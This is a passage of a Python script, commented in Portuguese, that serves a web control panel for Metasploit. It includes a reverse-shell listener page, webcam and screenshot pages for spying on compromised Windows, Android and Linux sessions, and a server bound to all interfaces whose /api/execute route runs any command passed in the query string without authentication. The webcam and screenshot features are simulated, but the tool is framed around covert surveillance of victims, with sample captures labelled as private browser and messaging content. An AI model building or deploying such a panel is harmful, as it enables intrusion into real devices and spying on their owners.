            setTimeout(() => {
                const filename = `${outputFile}.${outputFormat}`;
                addOutput(`Payload generated: ${filename}`, 'success');
                addOutput(`File saved to: payloads/${filename}`, 'success');
                
                document.getElementById('generated-files').innerHTML = `
                    <div style="color: #00ff00;">✓ ${filename}</div>
                    <div style="font-size: 0.9em; color: #0088ff;">Location: payloads/${filename}</div>
                `;
            }, 4000);

            updateListenerCommand();
        }

        function startListener() {
            const output = document.getElementById('output-terminal');
            const command = document.getElementById('listener-command').textContent;
            
            output.innerHTML = '';
            addOutput('Starting Metasploit listener...', 'info');
            addOutput('Executing commands:', 'info');
            
            command.split('\n').forEach(line => {
                addOutput(`msf6 > ${line}`, 'info');
            });

            setTimeout(() => {
                addOutput('[*] Started reverse TCP handler...', 'success');
                addOutput(`[*] Listening on ${document.getElementById('lhost').value}:${document.getElementById('lport').value}`, 'success');
                addOutput('[*] Waiting for connections...', 'info');
            }, 2000);
        }

        function addOutput(text, type = 'info') {
            const output = document.getElementById('output-terminal');
            const line = document.createElement('div');
            line.style.color = type === 'error' ? '#ff0000' : 
                             type === 'success' ? '#00ff00' : '#0088ff';
            line.textContent = text;
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }

        // Atualizar comando do listener quando os valores mudarem
        document.getElementById('payload-type').addEventListener('change', updateListenerCommand);
        document.getElementById('lhost').addEventListener('input', updateListenerCommand);
        document.getElementById('lport').addEventListener('input', updateListenerCommand);

        // Inicializar
        document.addEventListener('DOMContentLoaded', function() {
            updateListenerCommand();
        });
    </script>
</body>
</html>
"""

    def generate_webcam_html(self):
        """Controle de webcam"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Control - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .webcam-controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        .control-panel, .video-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .session-selector {
            margin-bottom: 20px;
        }

        .session-selector select {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .webcam-actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }

        .action-btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .action-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .action-btn.recording {
            border-color: #ff0000;
            color: #ff0000;
            animation: pulse 1s infinite;
        }

        .action-btn.recording:hover {
            background: #ff0000;
            color: var(--dark-bg);
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .video-feed {
            background: #000;
            border: 2px solid var(--hacker-green);
            border-radius: 10px;
            height: 400px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        .video-placeholder {
            text-align: center;
            color: #666;
        }

        .webcam-status {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
        }

        .status-online {
            color: var(--hacker-green);
        }

        .status-offline {
            color: #ff0000;
        }

        .recordings-list {
            max-height: 200px;
            overflow-y: auto;
            margin-top: 20px;
        }

        .recording-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            padding: 10px;
            margin-bottom: 5px;
            border-radius: 3px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .live-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #ff0000;
            margin-right: 10px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">WEBCAM CONTROL</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/screenshots" class="nav-btn">Screenshots</a>
                <a href="/audio" class="nav-btn">Audio</a>
            </nav>
        </header>

        <div class="webcam-controls">
            <div class="control-panel">
                <div class="panel-header">
                    <h3>🎮 Webcam Controls</h3>
                </div>

                <div class="session-selector">
                    <label>Select Session:</label>
                    <select id="webcam-session">
                        <option value="">Select a session...</option>
                        <option value="1">Session 1 - Windows (192.168.1.100)</option>
                        <option value="2">Session 2 - Android (192.168.1.101)</option>
                        <option value="3">Session 3 - Linux (192.168.1.102)</option>
                    </select>
                </div>

                <div class="webcam-actions">
                    <button class="action-btn" onclick="startWebcam()" id="start-btn">
                        📷 Start Webcam
                    </button>
                    <button class="action-btn" onclick="stopWebcam()" id="stop-btn" disabled>
                        ⏹️ Stop Webcam
                    </button>
                    <button class="action-btn" onclick="takeSnapshot()">
                        📸 Take Snapshot
                    </button>
                    <button class="action-btn" onclick="startRecording()" id="record-btn">
                        🎥 Start Recording
                    </button>
                </div>

                <div class="webcam-status">
                    <h4>Status:</h4>
                    <div id="webcam-status-text" class="status-offline">Webcam offline</div>
                    <div id="webcam-info" style="margin-top: 10px; font-size: 0.9em;">
                        Select a session and start webcam feed
                    </div>
                </div>

                <div class="recordings-list">
                    <h4>Recent Captures:</h4>
                    <div class="recording-item">
                        <span>webcam_1_20241201_120030.jpg</span>
                        <button class="action-btn" style="padding: 5px 10px;">Download</button>
                    </div>
                    <div class="recording-item">
                        <span>webcam_2_20241201_115945.jpg</span>
                        <button class="action-btn" style="padding: 5px 10px;">Download</button>
                    </div>
                </div>
            </div>

            <div class="video-panel">
                <div class="panel-header">
                    <h3>📹 Live Feed</h3>
                    <span id="live-indicator" style="color: #ff0000; font-size: 0.8em;">
                        ● LIVE
                    </span>
                </div>

                <div class="video-feed" id="video-feed">
                    <div class="video-placeholder" id="video-placeholder">
                        <div style="font-size: 3em; margin-bottom: 20px;">📷</div>
                        <div>Webcam feed will appear here</div>
                        <div style="font-size: 0.8em; margin-top: 10px; color: #666;">
                            Select a session and start webcam
                        </div>
                    </div>
                    <canvas id="webcam-canvas" style="display: none; max-width: 100%; max-height: 100%;"></canvas>
                </div>

                <div style="text-align: center;">
                    <div style="display: inline-block; background: #ff0000; color: white; padding: 5px 15px; border-radius: 20px; font-size: 0.8em;">
                        <span class="live-indicator"></span>
                        RECORDING
                    </div>
                </div>

                <div style="margin-top: 20px;">
                    <h4>Webcam Information:</h4>
                    <div id="camera-info" style="font-size: 0.9em; color: #888;">
                        No camera information available
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let isWebcamActive = false;
        let isRecording = false;
        let webcamInterval;

        function startWebcam() {
            const session = document.getElementById('webcam-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            const videoFeed = document.getElementById('video-feed');
            const placeholder = document.getElementById('video-placeholder');
            const canvas = document.getElementById('webcam-canvas');
            const statusText = document.getElementById('webcam-status-text');
            const startBtn = document.getElementById('start-btn');
            const stopBtn = document.getElementById('stop-btn');

            // Simular início da webcam
            placeholder.style.display = 'none';
            canvas.style.display = 'block';
            statusText.textContent = 'Webcam active - Session ' + session;
            statusText.className = 'status-online';
            startBtn.disabled = true;
            stopBtn.disabled = false;

            isWebcamActive = true;

            // Simular feed de vídeo
            simulateVideoFeed();

            // Atualizar informações da câmera
            document.getElementById('camera-info').innerHTML = `
                <div>Session: ${session}</div>
                <div>Resolution: 1280x720</div>
                <div>FPS: 30</div>
                <div>Status: <span style="color: #00ff00;">Active</span></div>
            `;
        }

        function stopWebcam() {
            const placeholder = document.getElementById('video-placeholder');
            const canvas = document.getElementById('webcam-canvas');
            const statusText = document.getElementById('webcam-status-text');
            const startBtn = document.getElementById('start-btn');
            const stopBtn = document.getElementById('stop-btn');

            placeholder.style.display = 'flex';
            canvas.style.display = 'none';
            statusText.textContent = 'Webcam offline';
            statusText.className = 'status-offline';
            startBtn.disabled = false;
            stopBtn.disabled = true;

            isWebcamActive = false;
            clearInterval(webcamInterval);

            document.getElementById('camera-info').innerHTML = 'No camera information available';
        }

        function takeSnapshot() {
            if (!isWebcamActive) {
                alert('Start webcam first');
                return;
            }

            // Simular captura de snapshot
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `webcam_snapshot_${timestamp}.jpg`;
            
            alert(`Snapshot captured: ${filename}`);
            
            // Adicionar à lista de capturas
            const recordingsList = document.querySelector('.recordings-list');
            const newItem = document.createElement('div');
            newItem.className = 'recording-item';
            newItem.innerHTML = `
                <span>${filename}</span>
                <button class="action-btn" style="padding: 5px 10px;">Download</button>
            `;
            recordingsList.appendChild(newItem);
        }

        function startRecording() {
            if (!isWebcamActive) {
                alert('Start webcam first');
                return;
            }

            const recordBtn = document.getElementById('record-btn');
            
            if (!isRecording) {
                isRecording = true;
                recordBtn.textContent = '⏹️ Stop Recording';
                recordBtn.classList.add('recording');
                
                // Simular gravação
                alert('Webcam recording started...');
            } else {
                isRecording = false;
                recordBtn.textContent = '🎥 Start Recording';
                recordBtn.classList.remove('recording');
                
                // Simular fim da gravação
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const filename = `webcam_recording_${timestamp}.avi`;
                alert(`Recording saved: ${filename}`);
            }
        }

        function simulateVideoFeed() {
            const canvas = document.getElementById('webcam-canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = 640;
            canvas.height = 480;

            let frameCount = 0;

            webcamInterval = setInterval(() => {
                // Limpar canvas
                ctx.fillStyle = '#001100';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Desenhar um retângulo verde para simular o feed
                ctx.strokeStyle = '#00ff00';
                ctx.lineWidth = 2;
                ctx.strokeRect(10, 10, canvas.width - 20, canvas.height - 20);
                
                // Adicionar algum texto
                ctx.fillStyle = '#00ff00';
                ctx.font = '14px Courier New';
                ctx.fillText('WEBCAM FEED SIMULATION', 50, 50);
                ctx.fillText(`Frame: ${frameCount++}`, 50, 80);
                ctx.fillText('Session: ' + document.getElementById('webcam-session').value, 50, 110);
                ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 50, 140);
                
                // Adicionar algum efeito visual
                for (let i = 0; i < 10; i++) {
                    const x = Math.random() * canvas.width;
                    const y = Math.random() * canvas.height;
                    ctx.fillStyle = `rgba(0, 255, 0, ${Math.random() * 0.3})`;
                    ctx.fillRect(x, y, 2, 2);
                }
            }, 1000 / 30); // 30 FPS
        }

        // Atualizar informações quando a sessão mudar
        document.getElementById('webcam-session').addEventListener('change', function() {
            if (isWebcamActive) {
                stopWebcam();
            }
        });
    </script>
</body>
</html>
"""

    def generate_screenshots_html(self):
        """Gerenciador de screenshots"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screenshots - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .screenshots-interface {
            display: grid;
            grid-template-columns: 300px 1fr;
            gap: 30px;
        }

        .control-panel, .gallery-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .session-selector {
            margin-bottom: 20px;
        }

        .session-selector select {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .screenshot-actions {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 20px;
        }

        .action-btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .action-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .action-btn.capture {
            border-color: var(--hacker-purple);
            color: var(--hacker-purple);
        }

        .action-btn.capture:hover {
            background: var(--hacker-purple);
            color: var(--dark-bg);
        }

        .sessions-list {
            max-height: 300px;
            overflow-y: auto;
            margin-top: 20px;
        }

        .session-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .session-item:hover {
            border-color: var(--hacker-blue);
        }

        .session-item.active {
            border-color: var(--hacker-green);
            background: #001100;
        }

        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
            max-height: 600px;
            overflow-y: auto;
        }

        .screenshot-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s;
        }

        .screenshot-item:hover {
            border-color: var(--hacker-blue);
            transform: translateY(-5px);
        }

        .screenshot-img {
            width: 100%;
            height: 150px;
            background: linear-gradient(45deg, #001100, #000811);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--hacker-green);
            font-size: 0.9em;
            text-align: center;
            padding: 10px;
        }

        .screenshot-info {
            padding: 10px;
            border-top: 1px solid var(--hacker-purple);
        }

        .screenshot-actions {
            display: flex;
            gap: 5px;
            margin-top: 10px;
        }

        .small-btn {
            background: transparent;
            border: 1px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.8em;
            transition: all 0.3s;
        }

        .small-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .screenshot-viewer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .viewer-content {
            max-width: 90%;
            max-height: 90%;
            position: relative;
        }

        .viewer-img {
            max-width: 100%;
            max-height: 100%;
            border: 2px solid var(--hacker-green);
            border-radius: 10px;
        }

        .close-viewer {
            position: absolute;
            top: -40px;
            right: 0;
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">SCREENSHOTS MANAGER</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/webcam" class="nav-btn">Webcam</a>
                <a href="/audio" class="nav-btn">Audio</a>
            </nav>
        </header>

        <div class="screenshots-interface">
            <div class="control-panel">
                <div class="panel-header">
                    <h3>🎮 Screenshot Controls</h3>
                </div>

                <div class="session-selector">
                    <label>Active Sessions:</label>
                    <select id="screenshot-session">
                        <option value="">Select a session...</option>
                        <option value="1">Session 1 - Windows (admin@192.168.1.100)</option>
                        <option value="2">Session 2 - Android (root@192.168.1.101)</option>
                        <option value="3">Session 3 - Linux (user@192.168.1.102)</option>
                    </select>
                </div>

                <div class="screenshot-actions">
                    <button class="action-btn capture" onclick="takeScreenshot()">
                        📸 Take Screenshot
                    </button>
                    <button class="action-btn" onclick="takeMultipleScreenshots()">
                        🔄 Take Multiple (5)
                    </button>
                    <button class="action-btn" onclick="startScreenshotMonitor()">
                        👁️ Start Monitor
                    </button>
                    <button class="action-btn" onclick="clearScreenshots()">
                        🗑️ Clear All
                    </button>
                </div>

                <div class="sessions-list">
                    <div class="session-item active">
                        <strong>Session 1</strong><br>
                        Windows - 192.168.1.100<br>
                        User: admin<br>
                        <small>Last screenshot: 2 min ago</small>
                    </div>
                    <div class="session-item">
                        <strong>Session 2</strong><br>
                        Android - 192.168.1.101<br>
                        User: root<br>
                        <small>Last screenshot: 5 min ago</small>
                    </div>
                    <div class="session-item">
                        <strong>Session 3</strong><br>
                        Linux - 192.168.1.102<br>
                        User: user<br>
                        <small>No screenshots</small>
                    </div>
                </div>
            </div>

            <div class="gallery-panel">
                <div class="panel-header">
                    <h3>🖼️ Screenshot Gallery</h3>
                    <div style="font-size: 0.9em; color: var(--hacker-blue);">
                        Total: <span id="screenshot-count">6</span> images
                    </div>
                </div>

                <div class="gallery-grid" id="screenshot-gallery">
                    <!-- Screenshots will be loaded here -->
                </div>
            </div>
        </div>
    </div>

    <div class="screenshot-viewer" id="screenshot-viewer">
        <div class="viewer-content">
            <button class="close-viewer" onclick="closeViewer()">✕ Close</button>
            <div class="viewer-img" id="viewer-img">
                <!-- Image will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        // Dados de exemplo para screenshots
        const sampleScreenshots = [
            {
                id: 1,
                session: 'Session 1',
                filename: 'screenshot_1_20241201_120030.jpg',
                timestamp: '2024-12-01 12:00:30',
                description: 'Windows Desktop - Active applications'
            },
            {
                id: 2,
                session: 'Session 1', 
                filename: 'screenshot_1_20241201_115945.jpg',
                timestamp: '2024-12-01 11:59:45',
                description: 'Browser with sensitive information'
            },
            {
                id: 3,
                session: 'Session 2',
                filename: 'screenshot_2_20241201_114520.jpg',
                timestamp: '2024-12-01 11:45:20',
                description: 'Android Home Screen'
            },
            {
                id: 4,
                session: 'Session 2',
                filename: 'screenshot_2_20241201_114015.jpg',
                timestamp: '2024-12-01 11:40:15',
                description: 'Android Messages App'
            },
            {
                id: 5,
                session: 'Session 1',
                filename: 'screenshot_1_20241201_113230.jpg',
                timestamp: '2024-12-01 11:32:30',
                description: 'File Explorer - Documents'
            },
            {
                id: 6,
                session: 'Session 3',
                filename: 'screenshot_3_20241201_112100.jpg',
                timestamp: '2024-12-01 11:21:00',
                description: 'Linux Terminal Session'
            }
        ];

        function loadScreenshotGallery() {
            const gallery = document.getElementById('screenshot-gallery');
            gallery.innerHTML = '';

            sampleScreenshots.forEach(screenshot => {
                const item = document.createElement('div');
                item.className = 'screenshot-item';
                item.innerHTML = `
                    <div class="screenshot-img" onclick="viewScreenshot(${screenshot.id})">
                        SCREENSHOT PREVIEW<br>
                        ${screenshot.session}<br>
                        ${screenshot.timestamp.split(' ')[1]}
                    </div>
                    <div class="screenshot-info">
                        <div style="font-weight: bold; margin-bottom: 5px;">${screenshot.filename}</div>
                        <div style="font-size: 0.8em; color: #888; margin-bottom: 5px;">
                            ${screenshot.timestamp}
                        </div>
                        <div style="font-size: 0.8em; margin-bottom: 10px;">
                            ${screenshot.description}
                        </div>
                        <div class="screenshot-actions">
                            <button class="small-btn" onclick="viewScreenshot(${screenshot.id})">View</button>
                            <button class="small-btn" onclick="downloadScreenshot(${screenshot.id})">Download</button>
                            <button class="small-btn" onclick="deleteScreenshot(${screenshot.id})">Delete</button>
                        </div>
                    </div>
                `;
                gallery.appendChild(item);
            });

            document.getElementById('screenshot-count').textContent = sampleScreenshots.length;
        }

        function takeScreenshot() {
            const session = document.getElementById('screenshot-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            // Simular captura de screenshot
            const timestamp = new Date().toLocaleString('en-US', { 
                year: 'numeric', 
                month: '2-digit', 
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false 
            }).replace(/[/,]/g, '').replace(/ /g, '_');

            const newScreenshot = {
                id: sampleScreenshots.length + 1,
                session: `Session ${session}`,
                filename: `screenshot_${session}_${timestamp}.jpg`,
                timestamp: new Date().toLocaleString(),
                description: `Screenshot from Session ${session}`
            };

            sampleScreenshots.unshift(newScreenshot);
            loadScreenshotGallery();

            // Mostrar confirmação
            alert(`Screenshot captured from Session ${session}`);
        }

        function takeMultipleScreenshots() {
            const session = document.getElementById('screenshot-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            alert(`Taking 5 screenshots from Session ${session}...`);
            
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    takeScreenshot();
                }, i * 2000);
            }
        }

        function startScreenshotMonitor() {
            const session = document.getElementById('screenshot-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            alert(`Starting screenshot monitor for Session ${session} (1 screenshot every 10 seconds)`);
            
            // Simular monitor contínuo
            const monitorInterval = setInterval(() => {
                if (confirm('Stop screenshot monitor?')) {
                    clearInterval(monitorInterval);
                    alert('Screenshot monitor stopped');
                } else {
                    takeScreenshot();
                }
            }, 10000);
        }

        function viewScreenshot(screenshotId) {
            const screenshot = sampleScreenshots.find(s => s.id === screenshotId);
            if (screenshot) {
                const viewer = document.getElementById('screenshot-viewer');
                const viewerImg = document.getElementById('viewer-img');
                
                // Simular imagem (em produção, carregaria a imagem real)
                viewerImg.innerHTML = `
                    <div style="background: #001100; padding: 50px; border-radius: 10px; text-align: center;">
                        <div style="font-size: 2em; margin-bottom: 20px;">🖼️</div>
                        <div style="font-size: 1.2em; margin-bottom: 10px;">${screenshot.filename}</div>
                        <div style="color: #888; margin-bottom: 20px;">${screenshot.timestamp}</div>
                        <div>${screenshot.description}</div>
                        <div style="margin-top: 30px; font-size: 0.9em; color: #666;">
                            Session: ${screenshot.session}<br>
                            Resolution: 1920x1080<br>
                            Size: 1.2 MB
                        </div>
                    </div>
                `;
                
                viewer.style.display = 'flex';
            }
        }

        function closeViewer() {
            document.getElementById('screenshot-viewer').style.display = 'none';
        }

        function downloadScreenshot(screenshotId) {
            const screenshot = sampleScreenshots.find(s => s.id === screenshotId);
            if (screenshot) {
                alert(`Downloading: ${screenshot.filename}`);
                // Em produção, faria o download real do arquivo
            }
        }

        function deleteScreenshot(screenshotId) {
            if (confirm('Are you sure you want to delete this screenshot?')) {
                const index = sampleScreenshots.findIndex(s => s.id === screenshotId);
                if (index !== -1) {
                    sampleScreenshots.splice(index, 1);
                    loadScreenshotGallery();
                    alert('Screenshot deleted');
                }
            }
        }

        function clearScreenshots() {
            if (confirm('Are you sure you want to delete ALL screenshots?')) {
                sampleScreenshots.length = 0;
                loadScreenshotGallery();
                alert('All screenshots cleared');
            }
        }

        // Inicializar gallery
        document.addEventListener('DOMContentLoaded', function() {
            loadScreenshotGallery();
            
            // Fechar viewer ao clicar fora
            document.getElementById('screenshot-viewer').addEventListener('click', function(e) {
                if (e.target === this) {
                    closeViewer();
                }
            });
        });
    </script>
</body>
</html>
"""

    def start_web_server(self):
        """Inicia servidor web"""
        class MetasploitWebHandler(BaseHTTPRequestHandler):
            msf_web = self
            
            def do_GET(self):
                """Manipula requisições GET"""
                parsed_path = urlparse(self.path)
                path = parsed_path.path
                
                # Rotas da aplicação
                routes = {
                    '/': 'index',
                    '/dashboard': 'dashboard',
                    '/payloads': 'payloads',
                    '/sessions': 'sessions',
                    '/exploits': 'exploits',
                    '/post_exploitation': 'post_exploitation',
                    '/webcam': 'webcam',
                    '/screenshots': 'screenshots',
                    '/audio': 'audio',
                    '/settings': 'settings'
                }
                
                if path in routes:
                    self.serve_template(routes[path])
                elif path == '/api/sessions':
                    self.api_get_sessions()
                elif path == '/api/execute':
                    self.api_execute_command()
                else:
                    self.send_error(404, "Page not found")
            
            def serve_template(self, template_name):
                """Serve templates HTML"""
                try:
                    html_content = self.msf_web.generate_html_template(template_name)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(html_content.encode('utf-8'))
                    
                except Exception as e:
                    self.send_error(500, f"Template error: {str(e)}")
            
            def api_get_sessions(self):
                """API: Retorna sessões"""
                sessions = self.msf_web.get_sessions()
                self.send_json_response(sessions)
            
            def api_execute_command(self):
                """API: Executa comando MSF"""
                try:
                    query_params = parse_qs(urlparse(self.path).query)
                    command = query_params.get('command', [None])[0]
                    
                    if command:
                        result = self.msf_web.execute_msf_command(command)
                        self.send_json_response({'success': True, 'result': result})
                    else:
                        self.send_json_response({'success': False, 'error': 'No command provided'})
                        
                except Exception as e:
                    self.send_json_response({'success': False, 'error': str(e)})
            
            def send_json_response(self, data):
                """Envia resposta JSON"""
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(data).encode())
            
            def log_message(self, format, *args):
                """Customiza logging"""
                print(f"[WEB] {self.client_address[0]} - {format % args}")
        
        try:
            self.web_server = HTTPServer(('0.0.0.0', self.config['web_port']), MetasploitWebHandler)
            print(f"[+] Metasploit Web Interface started on port {self.config['web_port']}")
            print(f"[+] Access: http://localhost:{self.config['web_port']}")
            
            self.web_server.serve_forever()
            
        except Exception as e:
            print(f"[-] Web server error: {e}")
    
    def start(self):
        """Inicia todos os serviços"""
        print("[+] Starting Metasploit Web Interface...")
        print(f"[+] Web Interface: http://0.0.0.0:{self.config['web_port']}")
        
        # Iniciar serviço do Metasploit
        if not self.start_metasploit_service():
            print("[-] Failed to start Metasploit service")
            return
        
        # Iniciar servidor web
        self.start_web_server()

def main():
    # Verificar se está no Termux
    if not os.path.exists('/data/data/com.termux/files/usr'):
        print("[!] This script is optimized for Termux")
    
    # Verificar se Metasploit está instalado
    try:
        subprocess.run(['msfconsole', '--version'], capture_output=True)
    except:
        print("[-] Metasploit not found. Please install Metasploit first.")
        print("    Run: pkg install metasploit")
        sys.exit(1)
    
    # Criar interface
    msf_web = MetasploitWebInterface()
    
    try:
        msf_web.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down Metasploit Web Interface...")
        sys.exit(0)

if __name__ == '__main__':
    main()
